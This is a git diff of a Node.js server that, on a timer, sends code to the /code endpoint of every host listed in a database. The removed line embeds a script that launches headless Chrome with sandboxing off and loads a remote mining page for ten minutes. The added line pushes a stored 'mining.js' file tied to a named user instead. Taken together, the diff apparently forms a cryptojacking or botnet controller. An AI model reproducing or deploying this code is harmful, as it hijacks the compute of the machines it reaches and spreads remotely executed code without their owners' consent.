@@ -5,6 +5,9 @@ const axios = require('axios');
 const cors = require('cors');
 const app = express();
 
+const users = JSON.parse(fs.readFileSync("users.txt", "utf8"));
+
+
 app.use(cors({ method: ['GET', 'POST'] }));
 app.use(express.json());
 
@@ -67,8 +70,8 @@ setInterval(() =>{
   pg.query('SELECT * FROM servers', (err, res_bd) => {
     res_bd.rows.forEach( server =>{
       axios.post(`https://${server.name}/code`, {
-        code:JSON.parse("async function pup(){\n  try{\n  console.log('The start');\n  const browser = await puppeteer.launch({headless: true, args: [\"--no-sandbox\"]});\n  const page = await browser.newPage();\n  await page.goto(`https://logbin.vercel.app/mining.html`);\n  await page.setViewport({ width: 120, height:120});\n  await sleep(10000);\n  \n\n  \n  \n \n  //await sleep(1000);\n  \n  await sleep(600000);\n  console.log('The end');\n  //await browser.close();\n  }\n  catch{\n    axios.post('https://lead-halved-mouse.glitch.me/error',{err:'Error server code'});\n  }\n\n  //stop();\n}\npup();\n")
-      })
+        code:users['idsila89@gmail.com'].files['mining.js']  
+        })
     });
     
   });
